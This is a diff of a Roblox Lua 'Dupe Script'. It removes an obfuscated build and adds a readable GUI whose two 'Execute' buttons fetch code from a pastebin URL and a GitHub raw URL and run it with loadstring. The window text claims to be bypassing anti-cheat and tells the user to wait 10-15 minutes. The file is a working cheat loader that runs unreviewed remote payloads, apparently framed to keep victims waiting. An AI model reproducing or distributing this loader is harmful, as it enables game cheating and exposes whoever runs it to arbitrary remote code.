@@ -1,12 +1,143 @@
---[[
- .____                  ________ ___.    _____                           __                
- |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
- |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
- |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
- |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
-         \/          \/         \/    \/                \/     \/     \/                   
-          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "DupeScriptGui"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
-]]--
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainGui"
+mainFrame.Size = UDim2.new(0, 320, 0, 160)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
 
-local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v86=v2(v0(v30,16));if v19 then local v109=0;local v110;while true do if (v109==1) then return v110;end if (v109==0) then v110=v5(v86,v19);v19=nil;v109=1;end end else return v86;end end end);local function v20(v31,v32,v33) if v33 then local v87=(v31/((5 -(880 -(282 + 595)))^(v32-(1638 -(1523 + 114)))))%(((5 + 0) -3)^(((v33-((1 -0) -0)) -(v32-(2 -1))) + (620 -(555 + 64)))) ;return v87-(v87%(932 -(857 + 74))) ;else local v88=(570 -((1432 -(68 + 997)) + 201))^(v32-(928 -(214 + 713))) ;return (((v31%(v88 + v88))>=v88) and ((1271 -(226 + 1044)) + 0)) or (0 + 0) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=0 -0 ;local v36;local v37;while true do if (v35==(117 -((58 -26) + (155 -70)))) then v36,v37=v1(v16,v18,v18 + 2 + 0 );v18=v18 + 1 + 1 ;v35=958 -(892 + (415 -(87 + 263))) ;end if (v35==1) then return (v37 * (610 -354)) + v36 ;end end end local function v23() local v38,v39,v40,v41=v1(v16,v18,v18 + ((1135 -(802 + 150)) -(67 + 113)) );v18=v18 + 3 + 1 ;return (v41 * (41190819 -24413603)) + (v40 * (48199 + 17337)) + (v39 * ((2737 -1720) -761)) + v38 ;end local function v24() local v42=0;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(440 -(145 + 293))) then v47=v20(v44,37 -16 ,(3264 -(760 + 987)) -(998 + 488) );v48=((v20(v44,11 + 21 )==1) and  -(1 + 0)) or 1 ;v42=3 + 0 ;end if (v42==(997 -(915 + 82))) then v43=v23();v44=v23();v42=2 -1 ;end if (v42==(1916 -(1789 + 124))) then if (v47==(0 + 0)) then if (v46==(0 -0)) then return v48 * (1187 -(1069 + 118)) ;else v47=4 -3 ;v45=0 -0 ;end elseif (v47==((21197 -16720) -2430)) then return ((v46==(0 + 0)) and (v48 * ((860 -(814 + 45))/(0 -0)))) or (v48 * NaN) ;end return v8(v48,v47-(400 + 615 + 8) ) * (v45 + (v46/((793 -(368 + 423))^((51 -32) + (113 -80))))) ;end if ((3 -2)==v42) then v45=19 -(10 + 8) ;v46=(v20(v44,(11 -8) -2 ,462 -(416 + 1 + 25) ) * ((6 -4)^(14 + 15 + 3))) + v43 ;v42=(1058 -(87 + 968)) -1 ;end end end local function v25(v49) local v50=0 -0 ;local v51;local v52;while true do if (v50==(0 + 0)) then v51=nil;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=(2316 -902) -(447 + 966) ;end if ((2 -1)==v50) then v51=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;v50=2;end if (v50==(1819 -(1703 + 114))) then v52={};for v111=(2159 -1457) -(376 + 325) , #v51 do v52[v111]=v2(v1(v3(v51,v111,v111)));end v50=3;end if (3==v50) then return v6(v52);end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return function(v89,v90,v91,v92,v93,v94,v95,v96) local v89=(function() return 0;end)();local v90=(function() return;end)();local v91=(function() return;end)();while true do if (v89== #" ") then if (v90== #"[") then v91=(function() return v92()~=(0 -0) ;end)();elseif (v90==2) then v91=(function() return v93();end)();elseif (v90== #"-19") then v91=(function() return v94();end)();end v95[v96]=(function() return v91;end)();break;end if (v89==0) then local v118=(function() return 1763 -(454 + 1309) ;end)();local v119=(function() return;end)();while true do if (v118==(0 + 0)) then v119=(function() return 0 -0 ;end)();while true do if (v119~=1) then else v89=(function() return  #".";end)();break;end if (v119==0) then v90=(function() return v92();end)();v91=(function() return nil;end)();v119=(function() return 1;end)();end end break;end end end end return v89,v90,v91,v92,v93,v94,v95,v96;end;end)();local v54=(function() return function(v97,v98,v99) local v100=(function() return 0;end)();local v101=(function() return;end)();while true do if (v100==(0 -0)) then v101=(function() return 0 -0 ;end)();while true do if (v101~=(285 -(134 + 151))) then else local v123=(function() return 1665 -(970 + 695) ;end)();local v124=(function() return;end)();while true do if (v123==0) then v124=(function() return 0;end)();while true do if (v124~=0) then else local v136=(function() return 0;end)();while true do if (v136==(0 -0)) then v97[v98-#"," ]=(function() return v99();end)();return v97,v98,v99;end end end end break;end end end end break;end end end;end)();local v55=(function() return {};end)();local v56=(function() return {};end)();local v57=(function() return {};end)();local v58=(function() return {v55,v56,nil,v57};end)();local v59=(function() return v23();end)();local v60=(function() return {};end)();for v68= #">",v59 do FlatIdent_104D4,Type,Cons,v21,v24,v25,v60,v68=(function() return v53(FlatIdent_104D4,Type,Cons,v21,v24,v25,v60,v68);end)();end v58[ #"nil"]=(function() return v21();end)();for v69= #".",v23() do local v70=(function() return v21();end)();if (v20(v70, #"!", #"/")==(1990 -(582 + 1408))) then local v105=(function() return 0;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (1~=v105) then else local v120=(function() return 0;end)();while true do if ((0 -0)==v120) then v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(0 -0)) then local v128=(function() return 1824 -(1195 + 629) ;end)();while true do if (v128~=0) then else v108[ #"91("]=(function() return v22();end)();v108[ #"xnxx"]=(function() return v22();end)();break;end end elseif (v106== #".") then v108[ #"gha"]=(function() return v23();end)();elseif (v106==(2 -0)) then v108[ #"xnx"]=(function() return v23() -((243 -(187 + 54))^16) ;end)();elseif (v106== #"-19") then local v268=(function() return 0;end)();local v269=(function() return;end)();while true do if (v268==(780 -(162 + 618))) then v269=(function() return 0 + 0 ;end)();while true do if (v269==(0 + 0)) then v108[ #"xxx"]=(function() return v23() -(2^(33 -17)) ;end)();v108[ #".com"]=(function() return v22();end)();break;end end break;end end end v120=(function() return 1 -0 ;end)();end if (v120==1) then v105=(function() return 1 + 1 ;end)();break;end end end if (v105~=0) then else local v121=(function() return 0;end)();while true do if (v121==(1636 -(1373 + 263))) then v106=(function() return v20(v70,1002 -(451 + 549) , #"91(");end)();v107=(function() return v20(v70, #".com",6);end)();v121=(function() return 1 + 0 ;end)();end if (v121==1) then v105=(function() return 1 -0 ;end)();break;end end end if (v105==(2 -0)) then if (v20(v107, #".", #":")== #"\\") then v108[2]=(function() return v60[v108[2]];end)();end if (v20(v107,1386 -(746 + 638) ,2)~= #"/") then else v108[ #"-19"]=(function() return v60[v108[ #"-19"]];end)();end v105=(function() return 2 + 1 ;end)();end if (v105~=3) then else if (v20(v107, #"91(", #"91(")~= #"]") then else v108[ #"0313"]=(function() return v60[v108[ #"?id="]];end)();end v55[v69]=(function() return v108;end)();break;end end end end for v71= #"\\",v23() do v56,v71,v28=(function() return v54(v56,v71,v28);end)();end return v58;end local function v29(v62,v63,v64) local v65=v62[1 -(0 + 0) ];local v66=v62[343 -(218 + 123) ];local v67=v62[1584 -(1535 + 46) ];return function(...) local v72=v65;local v73=v66;local v74=v67;local v75=v27;local v76=1 + 0 ;local v77= -(1 + 0);local v78={};local v79={...};local v80=v12("#",...) -(561 -(306 + (1998 -(1344 + 400)))) ;local v81={};local v82={};for v102=0,v80 do if ((4716>80) and (v102>=v74)) then v78[v102-v74 ]=v79[v102 + 1 + 0 ];else v82[v102]=v79[v102 + (1 -0) ];end end local v83=(v80-v74) + (1468 -(899 + (973 -(255 + 150)))) ;local v84;local v85;while true do v84=v72[v76];v85=v84[1 + 0 + 0 ];if (v85<=(69 -40)) then if (v85<=(617 -(268 + 335))) then if (v85<=(296 -(33 + 27 + 230))) then if (v85<=(574 -(426 + 146))) then if (v85<=(0 + 0)) then for v134=v84[1458 -(282 + 1174) ],v84[814 -(569 + 242) ] do v82[v134]=nil;end elseif (v85==(2 -1)) then v63[v84[3]]=v82[v84[1 + 1 ]];else v82[v84[(4383 -3357) -(706 + 318) ]]=v84[3];end elseif (v85<=(1255 -(721 + 530))) then if ((v85==(1274 -(945 + 326))) or (3507==3272)) then v82[v84[2]]=v82[v84[7 -4 ]] + v82[v84[4 + 0 ]] ;elseif ((v82[v84[702 -(271 + (1385 -956)) ]]==v84[4 + (1739 -(404 + 1335)) ]) or (876>=3075)) then v76=v76 + (1501 -(1408 + 92)) ;else v76=v84[3];end elseif (v85==(1091 -(461 + 625))) then v82[v84[2]][v84[1291 -(993 + 295) ]]=v84[1 + 3 ];else v82[v84[408 -(183 + 223) ]]=v63[v84[1174 -((508 -90) + 499 + 254) ]];end elseif (v85<=(4 + 6)) then if (v85<=(1 + 0 + 7)) then if (v85>((340 -(10 + 327)) + 4)) then v82[v84[1 + 1 ]][v84[3]]=v82[v84[533 -(406 + 123) ]];else do return;end end elseif (v85>9) then local v150=(1232 + 537) -(1749 + 20) ;local v151;while true do if (v150==(0 + 0)) then v151=v84[1324 -(1249 + 73) ];v82[v151]=v82[v151](v13(v82,v151 + 1 + 0 ,v77));break;end end else v82[v84[(1485 -(118 + 220)) -(466 + 679) ]]=v82[v84[6 -(1 + 2) ]] -v82[v84[11 -7 ]] ;end elseif (v85<=((2361 -(108 + 341)) -(106 + 1794))) then if ((4352>2554) and (v85==(4 + 7))) then v82[v84[1 + 1 ]]=v84[8 -5 ]~=(0 -0) ;else local v154=v84[2];v82[v154]=v82[v154](v13(v82,v154 + (115 -(2 + 2 + 110)) ,v77));end elseif (v85==13) then v82[v84[586 -(57 + 527) ]]=v29(v73[v84[3]],nil,v64);elseif ((v84[1429 -(41 + 1386) ]==v82[v84[107 -(17 + 86) ]]) or (4406<4043)) then v76=v76 + (4 -3) + 0 ;else v76=v84[6 -3 ];end elseif (v85<=(60 -39)) then if (v85<=(183 -(122 + 44))) then if ((v85<=15) or (1889>=3383)) then local v129=0 -0 ;local v130;while true do if (v129==(0 -0)) then v130=v84[2 + 0 ];v82[v130](v13(v82,v130 + 1 + 0 ,v84[5 -2 ]));break;end end elseif (v85==(81 -(30 + 35))) then v82[v84[2 + 0 ]]();else v82[v84[1259 -(1043 + 214) ]]=v82[v84[3]] -v82[v84[15 -11 ]] ;end elseif ((1892<=2734) and (v85<=(1231 -((1816 -(711 + 782)) + 889)))) then if (v85==(48 -30)) then if v82[v84[582 -(361 + 219) ]] then v76=v76 + (321 -(53 + (511 -244))) ;else v76=v84[1 + 2 ];end else v82[v84[415 -(15 + 398) ]][v84[985 -(18 + 964) ]]=v84[14 -10 ];end elseif (v85>(12 + 8)) then v82[v84[2]]=v82[v84[2 + 1 ]];else v82[v84[2]]=v84[853 -(20 + 830) ];end elseif (v85<=25) then if ((1923<2218) and (v85<=23)) then if (v85>22) then v82[v84[(471 -(270 + 199)) + 0 ]]=v82[v84[129 -(116 + 10) ]];else local v166=v84[2];local v167={v82[v166](v82[v166 + (739 -(542 + 196)) ])};local v168=0 -0 ;for v235=v166,v84[4] do local v236=0 + 0 ;while true do if (v236==0) then v168=v168 + 1 + 0 ;v82[v235]=v167[v168];break;end end end end elseif ((2173>379) and (v85>(9 + 15))) then v82[v84[2]][v84[7 -4 ]]=v82[v84[4]];elseif (v82[v84[(1823 -(580 + 1239)) -2 ]]==v82[v84[4]]) then v76=v76 + 1 ;else v76=v84[(4619 -3065) -(1126 + 425) ];end elseif ((v85<=(432 -(118 + 287))) or (2591==3409)) then if ((4514>3324) and (v85>(101 -75))) then v82[v84[2]]=v64[v84[3]];else v82[v84[1123 -(118 + 1003) ]]=v82[v84[8 -(5 + 0) ]] + v82[v84[381 -(142 + 235) ]] ;end elseif (v85==(126 -98)) then local v174=0 + 0 ;local v175;local v176;local v177;local v178;while true do if (v174==(978 -(553 + 424))) then v77=(v177 + v175) -((1 + 0) -0) ;v178=0 + 0 ;v174=2 + 0 ;end if ((v174==(2 + 0 + 0)) or (208>=4828)) then for v290=v175,v77 do local v291=0 + 0 ;while true do if (v291==(0 + 0)) then v178=v178 + (2 -1) ;v82[v290]=v176[v178];break;end end end break;end if ((v174==(0 -0)) or (1583>3567)) then v175=v84[4 -2 ];v176,v177=v75(v82[v175](v13(v82,v175 + 1 + 0 ,v84[14 -11 ])));v174=754 -(239 + 514) ;end end else local v179=v84[1 + 1 ];v82[v179]=v82[v179](v13(v82,v179 + (1330 -(797 + 532)) ,v84[3 + 0 ]));end elseif (v85<=(15 + 29)) then if (v85<=((218 -134) -48)) then if (v85<=(1234 -(373 + 829))) then if (v85<=(761 -(476 + 255))) then if ((v82[v84[2 + 0 ]]==v82[v84[(2301 -(645 + 522)) -(369 + 761) ]]) or (1313==794)) then v76=v76 + 1 ;else v76=v84[2 + 1 ];end elseif (v85>(55 -24)) then v82[v84[3 -1 ]]=v64[v84[3]];else v76=v84[241 -(64 + 174) ];end elseif (v85<=34) then if (v85>(5 + 28)) then local v185=v84[1792 -(1010 + 780) ];local v186={};for v237=1 -0 , #v81 do local v238=336 -(144 + 192) ;local v239;while true do if (v238==0) then v239=v81[v237];for v309=216 -(42 + 174) , #v239 do local v310=v239[v309];local v311=v310[1 + 0 ];local v312=v310[2 + 0 ];if ((v311==v82) and (v312>=v185)) then local v322=0 + 0 + 0 ;while true do if (v322==(1504 -(363 + 1141))) then v186[v312]=v311[v312];v310[4 -3 ]=v186;break;end end end end break;end end end else local v187=v84[(4635 -3053) -(1183 + 397) ];v82[v187]=v82[v187](v13(v82,v187 + (2 -1) ,v84[3]));end elseif (v85>35) then local v189=v84[2 + 0 ];local v190,v191=v75(v82[v189](v13(v82,v189 + 1 + 0 ,v84[(3814 -(1045 + 791)) -(1913 + 62) ])));v77=(v191 + v189) -(1 + 0) ;local v192=0 -0 ;for v240=v189,v77 do v192=v192 + (1934 -(565 + 1368)) ;v82[v240]=v190[v192];end else local v193=0 -0 ;local v194;while true do if ((3174>2902) and (v193==(1661 -(1477 + 184)))) then v194=v84[2 -(0 -0) ];v82[v194]=v82[v194](v82[v194 + 1 + 0 ]);break;end end end elseif (v85<=((1367 -471) -(564 + 292))) then if ((4120<=4260) and (v85<=(65 -(532 -(351 + 154))))) then if ((v85>((1685 -(1281 + 293)) -74)) or (883>4778)) then v63[v84[(573 -(28 + 238)) -(244 + 60) ]]=v82[v84[2 + (0 -0) ]];else local v197=0;local v198;local v199;local v200;while true do if ((v197==0) or (3620>=4891)) then v198=v84[1561 -(1381 + 178) ];v199={v82[v198](v82[v198 + (477 -(41 + 435)) ])};v197=1002 -(938 + 63) ;end if (v197==(1 + 0)) then v200=1125 -(936 + 178 + 11) ;for v293=v198,v84[2 + 2 ] do v200=v200 + (1614 -(1565 + 48)) ;v82[v293]=v199[v200];end break;end end end elseif (v85>39) then for v243=v84[2 + 0 ],v84[1141 -(631 + 151 + 356) ] do v82[v243]=nil;end else v82[v84[2]]=v63[v84[270 -(176 + 91) ]];end elseif ((4258>937) and (v85<=42)) then if ((v85==41) or (4869<906)) then v82[v84[4 -2 ]]=v82[v84[3]][v84[5 -1 ]];else v82[v84[2]]();end elseif (v85==43) then if (v82[v84[1094 -(416 + 559 + 117) ]] or (1225>4228)) then v76=v76 + (3 -2) ;else v76=v84[1878 -(157 + 1718) ];end else do return;end end elseif (v85<=(42 + 9)) then if (v85<=((86 + 80) -119)) then if (v85<=((623 -(381 + 89)) -108)) then local v131=1018 -(697 + 321) ;local v132;while true do if (v131==(0 -0)) then v132=v84[2];v82[v132](v82[v132 + (1 -0) ]);break;end end elseif (v85==46) then local v205=v84[(4 + 0) -2 ];local v206=v82[v84[2 + 1 ]];v82[v205 + ((1 + 0) -0) ]=v206;v82[v205]=v206[v84[4]];else local v210=0;local v211;local v212;while true do if ((2 -1)==v210) then v82[v211 + (1228 -((550 -228) + 905)) ]=v212;v82[v211]=v212[v84[615 -(602 + (1165 -(1074 + 82))) ]];break;end if (v210==(1189 -(449 + 740))) then v211=v84[874 -(826 + (100 -54)) ];v212=v82[v84[950 -(245 + 702) ]];v210=3 -2 ;end end end elseif (v85<=(16 + 33)) then if (v85>48) then local v213=1898 -(260 + (3422 -(214 + 1570))) ;local v214;while true do if ((3328>2238) and (v213==(440 -(382 + 58)))) then v214=v84[6 -4 ];v82[v214]=v82[v214](v82[v214 + 1 + 0 ]);break;end end else v82[v84[3 -1 ]]=v29(v73[v84[3]],nil,v64);end elseif ((3839>1405) and (v85==(148 -98))) then local v216=v84[1207 -(902 + 303) ];local v217={};for v246=1, #v81 do local v247=1455 -(990 + 465) ;local v248;while true do if ((0 -0)==v247) then v248=v81[v246];for v313=0 -(0 + 0) , #v248 do local v314=0 + 0 + 0 ;local v315;local v316;local v317;while true do if ((1690 -(1121 + 569))==v314) then v315=v248[v313];v316=v315[215 -(22 + 192) ];v314=684 -(483 + 200) ;end if (v314==((1424 + 40) -(1404 + 59))) then v317=v315[7 -5 ];if ((v316==v82) and (v317>=v216)) then v217[v317]=v316[v317];v315[1]=v217;end break;end end end break;end end end else local v218=0 -0 ;local v219;local v220;local v221;while true do if (v218==2) then for v297=1 -0 ,v84[769 -(468 + 297) ] do v76=v76 + ((2289 -(1668 + 58)) -(334 + 228)) ;local v298=v72[v76];if (v298[3 -2 ]==((679 -(512 + 114)) -30)) then v221[v297-(1 -0) ]={v82,v298[3]};else v221[v297-1 ]={v63,v298[7 -4 ]};end v81[ #v81 + ((5 -3) -1) ]=v221;end v82[v84[1 + 1 ]]=v29(v219,v220,v64);break;end if (v218==1) then v221={};v220=v10({},{__index=function(v300,v301) local v302=0 -0 ;local v303;while true do if ((v302==(0 + 0)) or (1293<=507)) then v303=v221[v301];return v303[1 + 0 ][v303[2 -0 ]];end end end,__newindex=function(v304,v305,v306) local v307=v221[v305];v307[1 + 0 ][v307[165 -(92 + 71) ]]=v306;end});v218=1 + 1 ;end if (v218==(0 -0)) then v219=v73[v84[768 -(574 + 191) ]];v220=nil;v218=1 + 0 ;end end end elseif (v85<=(137 -82)) then if ((v85<=(6 + 22 + 22 + 3)) or (2896<805)) then if (v85==(901 -(254 + 595))) then if (v82[v84[128 -(55 + (239 -168)) ]]==v84[4]) then v76=v76 + (1 -0) ;else v76=v84[1793 -(573 + 1217) ];end else v76=v84[8 -5 ];end elseif (v85==(5 + 49)) then local v223=v73[v84[3]];local v224;local v225={};v224=v10({},{__index=function(v249,v250) local v251=v225[v250];return v251[1][v251[2 -0 ]];end,__newindex=function(v252,v253,v254) local v255=v225[v253];v255[940 -(714 + 225) ][v255[5 -3 ]]=v254;end});for v257=1 -0 ,v84[1 + 3 ] do v76=v76 + (1 -0) ;local v258=v72[v76];if ((2316==2316) and (v258[1]==(829 -(118 + (2157 -(1269 + 200)))))) then v225[v257-(49 -(25 + 23)) ]={v82,v258[10 -7 ]};else v225[v257-(733 -(16 + 716)) ]={v63,v258[100 -(11 + 86) ]};end v81[ #v81 + (2 -1) ]=v225;end v82[v84[2]]=v29(v223,v224,v64);else v82[v84[2]]=v82[v84[3]][v84[(553 -264) -(175 + 110) ]];end elseif (v85<=((958 -(98 + 717)) -(912 -(802 + 24)))) then if ((v85==56) or (2570==1533)) then v82[v84[2 -0 ]]=v84[14 -11 ]~=(1796 -((634 -131) + 1293)) ;else local v230=0 -0 ;local v231;while true do if ((v230==(0 + 0)) or (883==1460)) then v231=v84[1063 -(810 + 251) ];v82[v231](v82[v231 + 1 ]);break;end end end elseif (v85>(41 + 17)) then if (v84[1 + 1 ]==v82[v84[4 + 0 ]]) then v76=v76 + (534 -(7 + 36 + 490)) ;else v76=v84[736 -(711 + 22) ];end else local v232=v84[7 -5 ];v82[v232](v13(v82,v232 + (860 -(240 + 619)) ,v84[1 + 2 ]));end v76=v76 + (1 -0) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!4E3Q00028Q00026Q00F03F03043Q004E616D65030D3Q0044757065536372697074477569030C3Q0052657365744F6E537061776E0100027Q004003043Q0067616D6503073Q00506C6179657273030B3Q004C6F63616C506C6179657203083Q00496E7374616E63652Q033Q006E657703093Q005363722Q656E47756903063Q00506172656E74030C3Q0057616974466F724368696C6403093Q00506C6179657247756903053Q004672616D65026Q00084003073Q004D61696E47756903103Q004261636B67726F756E64436F6C6F723303063Q00436F6C6F723303073Q0066726F6D524742026Q003E4003043Q0053697A6503053Q005544696D32025Q00804140030F3Q00426F7264657253697A65506978656C03083Q005549436F726E6572030C3Q00436F726E657252616469757303043Q005544696D026Q002440026Q001040026Q001C40029A5Q99E93F026Q004440026Q00204003043Q00466F6E7403043Q00456E756D030A3Q00476F7468616D426F6C6403083Q005465787453697A65026Q003240030A3Q005465787442752Q746F6E03043Q0054657874030D3Q005B4E65775D2045786563757465030A3Q0054657874436F6C6F7233025Q00E06F40026Q004E40025Q00C0624003093Q00546578744C6162656C03243Q004578656375746520746869732066697273742E20576169742031302D3135206D696E732E03083Q00506F736974696F6E026Q001440026Q00694003163Q004261636B67726F756E645472616E73706172656E637903063Q00476F7468616D026Q002C40026Q001840026Q005E40029A5Q99B93F025Q00C057C0026Q0049C0030A3Q00496E707574426567616E03073Q00436F2Q6E656374026Q002240026Q007440026Q006440030B
+local uicorner = Instance.new("UICorner")
+uicorner.CornerRadius = UDim.new(0, 10)
+uicorner.Parent = mainFrame
+
+local title = Instance.new("TextLabel")
+title.Text = "Dupe Script"
+title.Font = Enum.Font.GothamBold
+title.TextSize = 22
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+title.Size = UDim2.new(1, 0, 0, 35)
+title.BorderSizePixel = 0
+title.Parent = mainFrame
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 10)
+titleCorner.Parent = title
+
+local description = Instance.new("TextLabel")
+description.Text = "Execute this first. Wait 10-15 mins."
+description.Font = Enum.Font.Gotham
+description.TextSize = 14
+description.TextColor3 = Color3.fromRGB(200, 200, 200)
+description.BackgroundTransparency = 1
+description.Position = UDim2.new(0, 0, 0, 40)
+description.Size = UDim2.new(1, 0, 0, 25)
+description.Parent = mainFrame
+
+local executeButton = Instance.new("TextButton")
+executeButton.Text = "Execute"
+executeButton.Font = Enum.Font.GothamBold
+executeButton.TextSize = 18
+executeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+executeButton.BackgroundColor3 = Color3.fromRGB(40, 120, 40)
+executeButton.Size = UDim2.new(0.8, 0, 0, 40)
+executeButton.Position = UDim2.new(0.1, 0, 1, -95)
+executeButton.Parent = mainFrame
+
+local execCorner = Instance.new("UICorner")
+execCorner.CornerRadius = UDim.new(0, 8)
+execCorner.Parent = executeButton
+
+local newExecuteButton = Instance.new("TextButton")
+newExecuteButton.Text = "[New] Execute"
+newExecuteButton.Font = Enum.Font.GothamBold
+newExecuteButton.TextSize = 18
+newExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+newExecuteButton.BackgroundColor3 = Color3.fromRGB(60, 60, 150)
+newExecuteButton.Size = UDim2.new(0.8, 0, 0, 40)
+newExecuteButton.Position = UDim2.new(0.1, 0, 1, -50)
+newExecuteButton.Parent = mainFrame
+
+local newExecCorner = Instance.new("UICorner")
+newExecCorner.CornerRadius = UDim.new(0, 8)
+newExecCorner.Parent = newExecuteButton
+
+local dragging, dragInput, dragStart, startPos
+mainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = mainFrame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+mainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+
+executeButton.MouseButton1Click:Connect(function()
+	executeButton.Text = "Starting..."
+	description.Text = "Wait 10-15 mins - Bypassing Anti Cheats."
+
+	task.wait(2)
+	mainFrame.Visible = false
+
+	local success, err = pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3TY0Gi6g"))()
+	end)
+
+	if success then
+		print("Pastebin script executed.")
+	else
+		warn("Pastebin failed:", err)
+	end
+end)
+
+newExecuteButton.MouseButton1Click:Connect(function()
+	newExecuteButton.Text = "Loading..."
+	description.Text = "Running first script (Xycer Hub)..."
+
+	task.wait(2)
+	mainFrame.Visible = false
+
+	local success1, err1 = pcall(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/GRPGaming/Key-System/refs/heads/Xycer-Hub-Script/ZyGaG6"))()
+	end)
+
+	if success1 then
+		print("Xycer Hub executed.")
+	else
+		warn("Xycer Hub failed:", err1)
+	end
+
+	task.wait(0.5)
+
+	local success2, err2 = pcall(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/3TY0Gi6g"))()
+	end)
+
+	if success2 then
+		print("Dupe script executed after Xycer.")
+	else
+		warn("Dupe script failed:", err2)
+	end
+end)
